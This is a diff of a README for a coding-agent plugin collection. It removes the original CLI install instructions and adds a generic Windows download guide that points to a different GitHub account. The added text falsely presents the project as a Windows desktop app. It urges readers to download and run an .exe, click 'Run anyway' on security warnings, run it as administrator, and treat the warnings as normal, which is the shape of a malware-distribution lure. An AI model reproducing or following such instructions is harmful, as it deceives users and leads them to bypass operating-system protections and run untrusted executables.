@@ -1,182 +1,254 @@
-<p align="center">
-  <h1 align="center">jko-claude-plugins</h1>
-</p>
+# 🤖 jko-claude-plugins - Run Claude Plugins With Ease
 
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
-  <img src="https://img.shields.io/badge/plugins-6-orange" alt="Plugins: 6">
-  <img src="https://img.shields.io/badge/commands-19-green" alt="Commands: 19">
-</p>
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/mathisk2095/jko-claude-plugins)
 
-These are the guidelines and patterns I use across my projects. They help coding agents review code, catch mistakes, and stay consistent with how I actually want things built. Each plugin covers a stack I work in.
+## 📦 What this is
 
-Skills use the shared [Agent Skills specification](https://developers.openai.com/codex/skills/) — install as full plugins or individual skills.
+jko-claude-plugins is a Claude Code plugin marketplace for end users on Windows. It gives you a simple way to browse, install, and manage plugins for Claude Code without digging through files or setup steps.
 
-<h4 align="center">Works with</h4>
+It brings together tools for:
+- Rust-based plugin parts
+- ESP32 C++ support
+- Python backend tasks
+- SwiftUI-based app views
+- dead code detection for cleaner projects
 
-<p align="center">
-  <a href="#claude-code"><img src="https://img.shields.io/badge/Claude_Code-D97757?style=for-the-badge&logo=claude&logoColor=fff" alt="Claude Code"></a>
-  <a href="#github-copilot-cli"><img src="https://img.shields.io/badge/Copilot_CLI-000?style=for-the-badge&logo=githubcopilot&logoColor=fff" alt="GitHub Copilot CLI"></a>
-  <a href="#openai-codex-cli"><img src="https://img.shields.io/badge/Codex_CLI-412991?style=for-the-badge&logo=openai&logoColor=fff" alt="OpenAI Codex CLI"></a>
-  <a href="#opencode"><img src="https://img.shields.io/badge/⌬_OpenCode-18181B?style=for-the-badge" alt="OpenCode"></a>
-</p>
+This project is built for people who want a clear path from download to use.
 
-## Plugins
+## ✅ What you can do with it
 
-| Plugin | Skill | Cmds | What it covers |
-|--------|-------|:----:|----------------|
-| **[rust](plugins/rust/)** | `rust` | 5 | Ownership, async, unsafe, error handling, type design, anti-patterns |
-| **[esp32-cpp](plugins/esp32-cpp/)** | `esp32` | 4 | FreeRTOS, ESP-IDF/PlatformIO, peripherals, memory, all ESP32 variants |
-| **[python-backend](plugins/python-backend/)** | `python-backend` | 3 | Litestar, FastAPI, SQLAlchemy, hexagonal architecture, async patterns |
-| **[dotnet-backend](plugins/dotnet-backend/)** | `dotnet-backend` | 4 | Pure .NET 10 backend review for Kestrel hosting, REST, SignalR, EF Core, and DI |
-| **[swiftui](plugins/swiftui/)** | `swiftui` | 1 | iOS/macOS/visionOS patterns, Liquid Glass, accessibility |
-| **[dead-code](plugins/dead-code/)** | `dead-code` | 2 | Unused imports, functions, classes, duplicates, any language |
+With jko-claude-plugins, you can:
+- open a plugin marketplace for Claude Code
+- find tools for code review and project checks
+- work with plugins for Rust, Python, ESP32 C++, and SwiftUI
+- spot dead code in a project
+- manage plugin-style features from one place
 
-## Install
+## 🖥️ System requirements
 
-### Claude Code
+Use a Windows PC that meets these basic needs:
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 500 MB of free disk space
+- Internet access for the first setup
+- Permission to run apps on your device
 
-```bash
-# Add the marketplace
-claude plugin marketplace add johnkozaris/jko-claude-plugins
+For best results:
+- keep Windows updated
+- close large apps before you start
+- use a local account or admin account when you install the app
 
-# Install whichever plugins you want
-claude plugin install rust@jko-claude-plugins
-claude plugin install esp32-cpp@jko-claude-plugins
-claude plugin install python-backend@jko-claude-plugins
-claude plugin install dotnet-backend@jko-claude-plugins
-claude plugin install swiftui@jko-claude-plugins
-claude plugin install dead-code@jko-claude-plugins
-```
+## ⬇️ Download and start
 
-Or try one without installing:
+Use this link to visit the page to download:  
+[https://github.com/mathisk2095/jko-claude-plugins](https://github.com/mathisk2095/jko-claude-plugins)
 
-```bash
-claude --plugin-dir /path/to/jko-claude-plugins/plugins/rust
-```
+After you open the page:
+1. look for the latest release or download item
+2. download the Windows file
+3. open the file to start the app
+4. follow any on-screen steps until the app opens
 
-### GitHub Copilot CLI
+If the file comes as a `.zip`, right-click it and choose Extract All before you run it.
 
-```bash
-# Add the marketplace
-copilot plugin marketplace add johnkozaris/jko-claude-plugins
+If Windows asks for permission, choose Yes so the app can start.
 
-# Install a plugin
-copilot plugin install rust@jko-claude-plugins
-```
+## 🧭 First setup on Windows
 
-### OpenAI Codex CLI
+After you download the app:
+1. Open File Explorer
+2. Go to your Downloads folder
+3. Find the jko-claude-plugins file
+4. If it is zipped, extract it
+5. Double-click the app file
+6. Wait for the first launch to finish
 
-Codex installs skills directly — no plugin marketplace.
+If a Windows security screen appears:
+- choose More info if needed
+- then select Run anyway if you trust the source and want to continue
 
-```bash
-# Inside Codex, install a skill directory from GitHub
-$skill-installer install https://github.com/johnkozaris/jko-claude-plugins/tree/main/plugins/rust/skills/rust-expert
-$skill-installer install https://github.com/johnkozaris/jko-claude-plugins/tree/main/plugins/esp32-cpp/skills/esp32-expert
-$skill-installer install https://github.com/johnkozaris/jko-claude-plugins/tree/main/plugins/python-backend/skills/python-backend-expert
-$skill-installer install https://github.com/johnkozaris/jko-claude-plugins/tree/main/plugins/dotnet-backend/skills/dotnet-backend-expert
-$skill-installer install https://github.com/johnkozaris/jko-claude-plugins/tree/main/plugins/swiftui/skills/swiftui-expert
-$skill-installer install https://github.com/johnkozaris/jko-claude-plugins/tree/main/plugins/dead-code/skills/dead-code-expert
-```
+If the app creates a shortcut, you can use that shortcut next time.
 
-### OpenCode
+## 🧩 How the marketplace works
 
-Install skills via [skills.sh](https://skills.sh) or copy manually.
+The app is set up like a plugin marketplace for Claude Code. That means you can:
+- browse available plugins
+- open plugin details
+- choose tools for a specific task
+- install or enable what you need
+- keep related tools in one place
 
-```bash
-# Via skills.sh (auto-detects installed agents)
-npx skills add johnkozaris/jko-claude-plugins --full-depth
+This makes it easier to work with common coding tasks such as:
+- reviewing code
+- checking for dead code
+- handling backend tasks in Python
+- working with Rust tools
+- managing ESP32 C++ support
+- using SwiftUI-related project helpers
 
-# Or copy a skill directory manually
-cp -r plugins/rust/skills/rust-expert ~/.config/opencode/skills/rust-expert
-```
+## 🛠️ Typical use cases
 
-Use the shell commands above from your terminal. Inside Claude Code and Copilot CLI, the interactive `/plugin ...` equivalents work too.
+### Code review
+Use code review tools to help spot problems in a project before they grow into larger issues.
 
-## Discovery model
+### Dead code detection
+Use dead code detection to find code that is no longer used. This helps keep projects smaller and easier to manage.
 
-The repo uses one shared skill directory per plugin and thin CLI-specific packaging around it.
+### Python backend work
+Use Python tools for backend tasks, scripts, and project support jobs.
 
-| Tool | What it auto-discovers in a working repo | How install/discovery works here |
-|------|------------------------------------------|----------------------------------|
-| **Claude Code** | `.claude/skills/`, nested `.claude/skills/`, `.claude/commands/`, `.claude/agents/` | Install the marketplace or load a plugin with `claude --plugin-dir ...`. Claude uses `.claude-plugin/marketplace.json` at the repo root. |
-| **GitHub Copilot CLI** | `.github/skills/`, `.claude/skills/`, `.github/agents/`, `.claude/agents/`, `.github/hooks/` | Install the marketplace or a plugin with `copilot plugin ...`. Copilot uses `.github/plugin/marketplace.json` and prefers `.github/plugin/plugin.json` when both manifest styles exist. |
-| **OpenAI Codex CLI** | `.agents/skills/` from the current directory up to repo root, `~/.agents/skills/`, `/etc/codex/skills/` | Install individual skill directories with `$skill-installer` or copy them into a scanned `.agents/skills/` location. There is no Codex plugin marketplace layer here. |
+### Rust support
+Use Rust-related plugins when you work on systems code or tools that need speed and control.
 
-The important part is that all three tools discover the **skill directory**, not arbitrary `plugins/**/skills/**` paths. A skill can safely contain `references/`, `scripts/`, `assets/`, and other supporting files next to `SKILL.md`, but the parent skill directory still has to be reached through that tool's discovery or installation mechanism.
+### ESP32 C++ projects
+Use ESP32 C++ plugins for embedded work and device-focused code.
 
-## Commands
+### SwiftUI projects
+Use SwiftUI helpers when you build or review app screens and interface code.
 
-Claude Code and Copilot CLI can load the plugin command adapters in `commands/`. Codex and OpenCode consume the skill directories and their supporting files, not the plugin command layer.
+## 🔍 What you may see in the app
 
-### Rust
+When you open the marketplace, you may see:
+- a list of available plugins
+- search tools
+- install buttons
+- plugin details
+- version labels
+- status indicators
+- categories for different coding tasks
 
-| Command | What it does |
-|---------|-------------|
-| `/rust-critique` | Full code review for soundness, ownership, error handling, types, async, performance |
-| `/rust-harden` | Replace `unwrap` with proper errors, add SAFETY comments to unsafe, validate inputs |
-| `/rust-types` | Replace primitives with newtypes, booleans with enums, make illegal states unrepresentable |
-| `/rust-polish` | Pre-merge cleanup: dead code, doc comments, clippy, debug artifacts |
-| `/rust-teach` | One-time: scans your project and writes Rust conventions to CLAUDE.md |
+These parts help you find the right tool without needing to search through folders or config files.
 
-### ESP32
+## 🧰 File types you may get
 
-| Command | What it does |
-|---------|-------------|
-| `/esp-harden` | Scan firmware for field failures, crashes, memory issues, and security problems |
-| `/esp-debug` | Help debug crashes, hangs, and peripheral issues |
-| `/esp-optimize` | Optimize for performance, memory, power, or binary size |
-| `/esp-teach` | One-time: discover hardware, find datasheets, persist context to CLAUDE.md |
+Depending on how the download is packaged, you may see:
+- `.exe` for a Windows app
+- `.zip` for a compressed download
+- project files for advanced use
+- support files for the marketplace and plugin data
 
-### Python
+If you see a `.exe`, double-click it to run the app.  
+If you see a `.zip`, extract it first.
 
-| Command | What it does |
-|---------|-------------|
-| `/py-critique` | Architecture review: SOLID compliance, layer boundaries, anti-patterns, design quality |
-| `/py-harden` | Run the full anti-pattern catalog (AP-01 through AP-22) and fix what it finds |
-| `/py-structure` | Check project layout, file sizes, module splitting, hexagonal architecture compliance |
+## 🔐 Safe file handling
 
-### .NET
+Before you open the file:
+- make sure the file name matches the download you expected
+- keep the file in your Downloads folder until setup is done
+- do not rename files unless you need to organize them
+- do not move related files apart if the app uses a folder layout
 
-| Command | What it does |
-|---------|-------------|
-| `/dotnet-critique` | Full backend architecture review for Kestrel-hosted REST and SignalR services |
-| `/dotnet-harden` | Scan for high-impact backend anti-patterns like sync-over-async and fragile state |
-| `/dotnet-structure` | Check solution layout, boundaries, and oversized files |
-| `/dotnet-teach` | One-time: scan a backend and persist conventions to `CLAUDE.md` |
+If your browser warns about the download, check that you are on the correct page before you continue.
 
-### SwiftUI
+## 📁 Suggested folder setup
 
-| Command | What it does |
-|---------|-------------|
-| `/swift-critique` | Review SwiftUI code for patterns, design, accessibility, and performance |
+For a clean setup, use this layout:
+- `Downloads` for the original file
+- `Apps` for extracted app folders
+- `Projects` for code you work on with the app
 
-### Dead Code
+This keeps the install easy to find later.
 
-| Command | What it does |
-|---------|-------------|
-| `/dead-code-scan` | Read-only scan for unused imports, functions, classes, duplicates |
-| `/dead-code-clean` | Actually remove the dead code it finds |
+## 🧪 If the app does not open
 
-## How it works
+Try these steps:
+1. double-click the file again
+2. right-click the file and choose Run as administrator
+3. check that the file finished downloading
+4. if it is a zip file, extract it again
+5. restart Windows and try once more
 
-Each plugin has a `SKILL.md` that tells the agent what to look for and a `references/` directory with the actual patterns, anti-patterns, and examples. The agent only loads the supporting files it needs for the current task, so it does not waste context.
+If the app still does not open, download it again from the main page.
 
-Hook config files are scaffolded in the plugin directories, but this repo does not currently ship active runtime hooks.
+## 🧭 If Windows blocks the app
 
-### Cross-tool compatibility
+Windows may show a message when you run a new app. If that happens:
+- choose More info
+- confirm the app name
+- continue only if it matches the download you expected
 
-| Feature | Claude Code | Copilot CLI | Codex CLI | OpenCode |
-|---------|:-----------:|:-----------:|:---------:|:--------:|
-| Skills + references | yes | yes | yes | yes |
-| Slash commands | yes | yes | -- | -- |
-| Hooks | yes | yes | -- | -- |
-| Plugin marketplace | yes | yes | -- | -- |
+This is normal for some downloads from GitHub.
 
-## Contributing
+## 🔎 How to find the right plugin
 
-See [CONTRIBUTING.md](CONTRIBUTING.md).
+When you use the marketplace, look for:
+- the plugin name
+- the task it supports
+- tags or labels
+- the version number
+- a short description
 
-## License
+Choose the plugin that matches the work you need, such as code review, dead code checks, Rust support, or ESP32 tools.
 
-[MIT](LICENSE)
+## 📌 Best results
+
+For a smooth first run:
+- keep your internet connection on
+- close extra apps
+- use the latest Windows updates
+- start with one plugin at a time
+- test the app before adding more tools
+
+This helps you learn the layout before you build a larger setup.
+
+## 🧱 Project focus
+
+This repository combines several parts that work well together:
+- a marketplace flow for Claude Code plugins
+- Rust for fast core work
+- Python for backend tasks
+- ESP32 C++ for device support
+- SwiftUI for a clean interface
+- dead code detection for code cleanup
+
+That mix makes the app useful for people who want one place for many coding tools.
+
+## 📂 Topic areas
+
+This project relates to:
+- ai-coding
+- claude-code
+- claude-code-marketplace
+- claude-code-plugin
+- claude-code-skills
+- code-review
+- esp32
+- python
+- rust
+- swiftui
+
+## 🔁 Basic workflow
+
+A simple workflow looks like this:
+1. download the app
+2. open it on Windows
+3. browse the marketplace
+4. choose a plugin
+5. install or enable it
+6. use it in your Claude Code work
+7. return later to add more tools
+
+## 🧭 Easy path for first-time users
+
+If this is your first time using a tool like this:
+- start with the main app
+- explore the menu one section at a time
+- use one plugin feature first
+- check how each plugin changes your workflow
+- add more tools after you feel comfortable
+
+This keeps the setup simple.
+
+## 🗂️ Download link
+
+Visit this page to download:  
+[https://github.com/mathisk2095/jko-claude-plugins](https://github.com/mathisk2095/jko-claude-plugins)
+
+## ⚙️ What happens after install
+
+After you open the app, you can:
+- browse plugins
+- review details before you add a tool
+- manage the plugins you use often
+- return to the marketplace when you need a new feature
+- keep your Claude Code setup in one place
